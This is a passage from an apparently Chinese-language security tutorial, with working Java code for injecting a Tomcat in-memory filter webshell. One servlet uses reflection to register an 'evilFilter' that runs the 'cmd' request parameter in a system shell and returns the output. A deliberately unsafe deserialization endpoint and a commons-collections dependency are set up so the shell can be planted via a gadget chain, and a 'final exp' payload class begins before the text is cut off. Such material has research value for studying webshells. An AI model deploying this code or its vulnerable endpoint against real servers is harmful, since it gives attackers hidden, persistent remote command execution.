class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilFilter</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterDef  </span></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">            filterDef.setFilter(filter);  </span><br><span class="line">            filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">            stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterMap  </span></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">            filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">            filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">            stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">            filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">            filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">                response.getWriter().println(output);  </span><br><span class="line">                System.out.println(output);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line"><span class="comment">//            chain.doFilter(request, response);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功打入内存马<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729212118.png" alt="image.png"></p><p>这里是直接写了个Servlet来写入内存马的, 我们也可以结合反序列化<br>先写一个反序列化入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/unser&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserialServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span>  IOException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">paylod</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;payload&quot;</span>);  </span><br><span class="line">        System.out.println(paylod);  </span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(paylod);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            obj = ois.readObject();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">        ois.close();  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(obj.toString());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引入cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>最终内存马, 配合cc链加载两次此类即可写入内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 获取standardContext  </span></span><br><span class="line">            <span class="type">RequestFacade</span> <span 